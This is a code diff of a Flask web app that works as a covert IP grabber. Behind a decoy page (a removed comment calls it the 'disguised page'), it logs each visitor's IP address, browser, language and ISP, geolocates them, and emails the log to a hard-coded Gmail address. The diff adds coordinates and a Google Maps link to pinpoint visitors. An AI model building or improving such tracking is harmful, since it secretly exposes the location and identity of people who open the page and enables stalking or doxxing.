@@ -21,8 +21,9 @@ def index():
     user_agent = request.headers.get('User-Agent')
     accept_language = request.headers.get('Accept-Language', 'Unknown')
 
-    # 用 IP 查詢位置信息（國家、地區、城市）
+    # 用 IP 查詢地理位置
     location_info = "Unknown"
+    map_link = ""
     try:
         res = requests.get(f"https://ipapi.co/{user_ip}/json/")
         data = res.json()
@@ -30,27 +31,27 @@ def index():
         region = data.get("region", "N/A")
         city = data.get("city", "N/A")
         org = data.get("org", "N/A")
+        lat = data.get("latitude", "")
+        lon = data.get("longitude", "")
         location_info = f"{country}, {region}, {city} ({org})"
+        if lat and lon:
+            map_link = f"https://www.google.com/maps?q={lat},{lon}"
     except Exception as e:
         location_info = f"Error retrieving location: {e}"
 
-    # 時間戳
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # 整理信件內容
     message = f"""[IP Access Log]
 
 Time: {timestamp}
 IP Address: {user_ip}
 Location: {location_info}
+Map: {map_link}
 Browser Info: {user_agent}
 Language: {accept_language}
 """
 
-    # 傳送 Email
     send_email("sces9204@gmail.com", message)
-
-    # 顯示偽裝頁面
     return render_template("index.html")
 
 def send_email(to, msg):
@@ -58,7 +59,7 @@ def send_email(to, msg):
     gmail_pass = os.environ.get("GMAIL_PASS")
 
     mime_msg = MIMEText(msg, _charset='utf-8')
-    mime_msg['Subject'] = Header('Visitor IP Log - Detail', 'utf-8')
+    mime_msg['Subject'] = Header('📡 Visitor IP Tracking Log', 'utf-8')
     mime_msg['From'] = gmail_user
     mime_msg['To'] = to
 
